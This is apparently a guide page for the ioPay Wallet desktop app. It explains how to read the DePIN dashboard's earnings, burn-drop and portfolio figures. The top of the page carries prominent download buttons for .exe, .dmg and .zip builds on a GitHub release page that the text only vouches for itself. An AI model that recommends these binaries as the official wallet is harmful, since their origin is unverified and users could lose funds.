![ioPay Wallet: desktop wallet guide](assets/banner-article.png)

# The ioPay DePIN Dashboard: Reading Your Device Earnings

The DePIN dashboard in ioPay Wallet puts four things in one place: **device earnings**, **ioID registration**, **burn-drop allocations per staking bucket**, and a **project explorer with an earnings calculator** (F025). If you only ever look at one number on it, you will misread the other three - so this page is about what each panel actually represents.

<p align="center"><a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-win-v2.0.2.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-0969da?style=for-the-badge&labelColor=0B1733&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-macos-v2.0.2.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-0969da?style=for-the-badge&labelColor=0B1733&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-linux-v2.0.2.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-0969da?style=for-the-badge&labelColor=0B1733&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| ![Windows](https://img.shields.io/badge/platform-Windows-0969da?style=flat-square&labelColor=0B1733&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white) | Windows 10 (1909) or later, 64-bit | [iopay-wallet-desktop-win-v2.0.2.exe](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-win-v2.0.2.exe) |
| ![macOS](https://img.shields.io/badge/platform-macOS-0969da?style=flat-square&labelColor=0B1733&logo=apple&logoColor=white) | macOS 12 or later | [iopay-wallet-desktop-macos-v2.0.2.dmg](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-macos-v2.0.2.dmg) |
| ![Linux](https://img.shields.io/badge/platform-Linux-0969da?style=flat-square&labelColor=0B1733&logo=linux&logoColor=white) | x64, Ubuntu 20.04 or later, or equivalent | [iopay-wallet-desktop-linux-v2.0.2.zip](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-linux-v2.0.2.zip) |

</div>

All three files and their sizes are on the [ioPay Wallet v2.0.2 release page](https://github.com/iopay-project/iopay-desktop-wallet/releases/tag/v2.0.2); their SHA-256 values are published in the [app README](https://github.com/iopay-project/iopay-desktop-wallet).

> **Only download from this GitHub release page.** A build offered anywhere else is not this release, whatever name it carries.

## The four panels

**Devices.** What is registered to your account, per device. A device that is not registered does not appear, and a device registered to a different account belongs to that account - which is why "my device is missing" is usually a registration or account question, not a sync bug.

**Earnings.** What each device has been credited, as reported by the projects it participates in. This is an aggregate of their records, not a ledger the wallet keeps.

**Burn-drop allocations.** A separate mechanism entirely: device activation burns IOTX and restakes it to **qualified staking buckets** (F033). The allocation is attached to a staking bucket, not to a device - so this panel only means anything if you stake, and the terms belong to the staking side of the app.

**Explorer and calculator.** A directory of projects and arithmetic on the current rate (F025). Neither is a recommendation, and the calculator's output is a projection.

## Read them separately, or the numbers will not reconcile

The most common mistake with a DePIN dashboard is adding everything into one "rewards" figure and comparing it to a project's own dashboard. It will not match, because the sources are different:

| What you see | Where it comes from | Who is the authority |
|---|---|---|
| Device earnings | the project(s) the device participates in | the project |
| Burn-drop allocation | the chain, against qualified staking buckets | the chain / staking state |
| Portfolio value | market data feeds for token prices | the market |
| Calculator projection | arithmetic on the current rate | nobody - it is a projection |

Keep device earnings and burn-drop allocations in separate columns in your head. One is payment for a resource; the other is a staking-linked allocation. They can both be real and still not be the same thing.

## "My device is not listed"

Work through these, in order:

1. **Is it registered?** Registration is the step that creates the on-chain identity. [Registering an ioID device](https://github.com/iopay-project/staking-bridge-and-depin/blob/main/registering-an-ioid-device-with-iopay.md).
2. **Is it registered to this account?** One phrase can hold several accounts. A device registered from another account will not appear here.
3. **Is the app connected?** A dashboard that cannot reach a node shows stale or empty panels. [Network errors](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/iopay-wallet-not-connecting-to-network.md).
4. **Is the project reporting anything yet?** A newly registered device with no activity may have nothing to show, which is different from being missing.

## What the dashboard does not tell you

**Whether the project will keep paying.** Reward rates are the project's decision, and they change.

**Whether your device is profitable.** That depends on hardware cost, electricity, the token's value and the project's rate - none of which the wallet knows. The calculator can project at a current rate; it cannot tell you whether the rate holds.

**Whether an allocation is withdrawable.** Burn-drop allocations attach to staking positions with their own rules, and the staking side of the app is where those rules live. [How staking works](https://github.com/iopay-project/staking-bridge-and-depin/blob/main/how-to-stake-iotx-in-iopay-wallet.md).

**What the tax treatment is.** The wallet can export records; it does not give tax advice, and a tax export is a starting point for a professional, not an answer.

## A reading routine that works

- **Check weekly, not continuously.** Device earnings move at the project's cadence, not yours.
- **Record a baseline** when a device first earns, so a later number has context.
- **Reconcile against the project's own dashboard** when something looks off - if they disagree, the project's record wins and the wallet is behind.
- **Export on a schedule** if you report this income. [Tracking device rewards](https://github.com/iopay-project/staking-bridge-and-depin/blob/main/tracking-depin-device-rewards-in-iopay-wallet.md) covers the routine and the export.

## FAQ

**How do I see what my DePIN devices earned?**
Open the DePIN section - registered devices and their earnings are listed there, per device, alongside burn-drop allocations and the explorer.

**Why is my device not listed?**
It is not registered, it is registered to another account, or the app cannot reach the chain. Check those three before anything else.

**Why do my device earnings and my burn-drop allocation not match?**
They are different mechanisms with different sources. Device earnings come from the project; burn-drop allocations come from device activation and attach to qualified staking buckets.

**Does the dashboard show projected income?**
It has a calculator that projects at the current rate. A projection is arithmetic on today's number, not a forecast.

## The fourth number: portfolio value

There is a figure on screen that is not a reward at all, and it causes more confusion than the other three combined. Portfolio value is market data - token prices multiplied by what you hold - refreshed from a price feed, not from a project or from the chain's staking state.

So it moves when nothing has been earned, and it can fall on a day your device earned its best week. Reading it as income is the mistake; reading it as a valuation that happens to include the token your rewards arrive in is the correct one. If a screenshot shows a portfolio change and an earnings figure that disagree, they are not disagreeing - they are measuring different things.

## When the panels disagree with the chain

A dashboard that cannot reach a node shows the last values it managed to fetch, which can be hours old and still look plausible. Before drawing a conclusion from a number that seems wrong, check whether the rest of the app is current: a balance that matches an explorer, a history that ends with the transaction you just sent.

If some panels update and others do not, the stale one may be waiting on a project's data rather than on the chain, and it will catch up on its own. Reinstalling to fix a panel is the one response that changes nothing, since the panel is read from elsewhere.

---

*Panels, registration and calculator behaviour follow the v2.0.2 feature set; ioID and burn-drop follow IoTeX documentation. No reward rate or income figure is stated.*
